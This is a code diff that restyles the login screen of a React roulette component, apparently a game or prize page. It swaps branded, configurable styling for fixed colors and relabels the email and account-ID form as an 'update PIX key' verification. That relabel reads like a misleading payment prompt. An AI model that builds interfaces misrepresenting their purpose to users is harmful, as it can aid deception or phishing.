@@ -74,125 +74,100 @@ const Roleta = () => {
   // Login / identification screen
   if (!identified) {
     return (
-      <div className="min-h-screen flex flex-col items-center justify-center relative overflow-hidden" style={{ background: '#0a0a0f' }}>
+      <div className="min-h-screen flex items-center justify-center relative overflow-hidden" style={{ background: '#1a0a2e' }}>
         {config.backgroundImageUrl && (
           <div
-            className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-30"
+            className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-20"
             style={{ backgroundImage: `url(${config.backgroundImageUrl})` }}
           />
         )}
-        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-black/70" />
-        <div
-          className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] rounded-full blur-[120px] opacity-15"
-          style={{ background: `radial-gradient(circle, ${config.glowColor}, transparent)` }}
-        />
-
-        {/* Header */}
-        {config.headerMode === 'image' && config.headerImageUrl ? (
-          <img
-            src={config.headerImageUrl}
-            alt="Header"
-            className="relative z-10 mb-8 object-contain"
-            style={{ height: config.headerImageSize, maxWidth: '90vw' }}
-          />
-        ) : (
-          <>
-            <h1
-              className="relative z-10 font-display font-black tracking-[0.3em] uppercase mb-2"
-              style={{
-                fontSize: config.headerTitleSize,
-                color: config.glowColor,
-                textShadow: `0 0 30px ${config.glowColor}55`,
-              }}
-            >
-              {config.pageTitle}
-            </h1>
-            <p
-              className="relative z-10 font-display tracking-[0.5em] text-muted-foreground uppercase mb-8"
-              style={{ fontSize: config.headerSubtitleSize }}
-            >
-              {config.pageSubtitle}
-            </p>
-          </>
-        )}
+        <div className="absolute inset-0" style={{ background: 'radial-gradient(ellipse at center, rgba(80,20,120,0.3) 0%, rgba(10,5,30,0.9) 70%)' }} />
 
         {/* Login card */}
         <form
           onSubmit={handleIdentify}
-          className="relative z-10 w-full max-w-sm mx-4 rounded-2xl p-8 space-y-6"
+          className="relative z-10 w-full max-w-sm mx-4 rounded-xl p-6 space-y-5"
           style={{
-            background: 'rgba(20, 20, 30, 0.85)',
-            border: `2px solid ${config.glowColor}33`,
-            boxShadow: `0 0 40px ${config.glowColor}15, 0 8px 32px rgba(0,0,0,0.5)`,
-            backdropFilter: 'blur(20px)',
+            background: 'rgba(20, 12, 40, 0.95)',
+            border: '1px solid rgba(255,255,255,0.08)',
+            boxShadow: '0 20px 60px rgba(0,0,0,0.5)',
           }}
         >
-          <div className="text-center space-y-2">
-            <h2
-              className="font-display font-bold text-xl tracking-wider uppercase"
-              style={{ color: config.glowColor }}
-            >
-              Identificação
-            </h2>
-            <p className="text-xs text-muted-foreground tracking-wide">
-              Informe seu e-mail e ID de conta para acessar a roleta
-            </p>
+          {/* Header with close button */}
+          <div className="flex items-start justify-between">
+            <div>
+              <h2
+                className="font-bold text-lg tracking-wide"
+                style={{ color: '#ffffff' }}
+              >
+                Atualizar Chave PIX
+              </h2>
+              <p className="text-xs mt-1" style={{ color: 'rgba(255,255,255,0.5)' }}>
+                Informe o e-mail e o ID da sua conta para verificarmos seu cadastro.
+              </p>
+            </div>
+            <button type="button" className="text-lg" style={{ color: 'rgba(255,255,255,0.4)' }}>
+              ✕
+            </button>
           </div>
 
-          <div className="space-y-2">
-            <label className="text-xs text-muted-foreground font-display tracking-wider uppercase">
-              E-mail
+          {/* Email field */}
+          <div className="space-y-1.5">
+            <label className="text-xs font-bold tracking-wider uppercase" style={{ color: '#ffffff' }}>
+              E-MAIL
             </label>
             <input
               type="email"
               value={emailValue}
               onChange={e => setEmailValue(e.target.value)}
-              placeholder="seuemail@exemplo.com"
+              placeholder="seu@email.com"
               maxLength={255}
               required
-              className="w-full px-4 py-3 rounded-lg text-sm font-display tracking-wide outline-none transition-all duration-300"
+              className="w-full px-4 py-3 rounded-lg text-sm outline-none transition-all duration-300"
               style={{
-                background: 'rgba(255,255,255,0.06)',
-                border: `1.5px solid ${config.glowColor}33`,
+                background: 'rgba(255,255,255,0.04)',
+                border: '2px solid #D4A017',
                 color: '#fff',
               }}
-              onFocus={e => (e.target.style.borderColor = `${config.glowColor}88`)}
-              onBlur={e => (e.target.style.borderColor = `${config.glowColor}33`)}
+              onFocus={e => (e.target.style.borderColor = '#FFD700')}
+              onBlur={e => (e.target.style.borderColor = '#D4A017')}
             />
           </div>
 
-          <div className="space-y-2">
-            <label className="text-xs text-muted-foreground font-display tracking-wider uppercase">
-              ID da Conta
+          {/* Account ID field */}
+          <div className="space-y-1.5">
+            <label className="text-xs font-bold tracking-wider uppercase" style={{ color: '#ffffff' }}>
+              ID DA CONTA
             </label>
             <input
               type="text"
               value={inputValue}
               onChange={e => setInputValue(e.target.value)}
-              placeholder="Digite seu ID..."
+              placeholder="Seu ID na plataforma"
               maxLength={100}
               required
-              className="w-full px-4 py-3 rounded-lg text-sm font-display tracking-wide outline-none transition-all duration-300"
+              className="w-full px-4 py-3 rounded-lg text-sm outline-none transition-all duration-300"
               style={{
-                background: 'rgba(255,255,255,0.06)',
-                border: `1.5px solid ${config.glowColor}33`,
+                background: 'rgba(255,255,255,0.04)',
+                border: '2px solid #D4A017',
                 color: '#fff',
               }}
-              onFocus={e => (e.target.style.borderColor = `${config.glowColor}88`)}
-              onBlur={e => (e.target.style.borderColor = `${config.glowColor}33`)}
+              onFocus={e => (e.target.style.borderColor = '#FFD700')}
+              onBlur={e => (e.target.style.borderColor = '#D4A017')}
             />
           </div>
 
+          {/* Submit button */}
           <button
             type="submit"
-            className="w-full py-3 rounded-lg font-display font-bold text-sm tracking-widest uppercase transition-all duration-300 hover:scale-[1.02] active:scale-[0.98]"
+            className="w-full py-3.5 rounded-lg font-bold text-sm tracking-[0.2em] uppercase transition-all duration-300 hover:brightness-110 active:scale-[0.98]"
             style={{
-              background: config.buttonColor,
-              color: config.buttonTextColor,
-              boxShadow: `0 0 20px ${config.buttonColor}44, 0 4px 15px rgba(0,0,0,0.3)`,
+              background: 'linear-gradient(180deg, #4DD8E0 0%, #0ABACC 50%, #0898A8 100%)',
+              color: '#000000',
+              boxShadow: '0 4px 20px rgba(13,186,204,0.35)',
             }}
           >
-            ENTRAR
+            VERIFICAR CADASTRO
           </button>
         </form>
       </div>
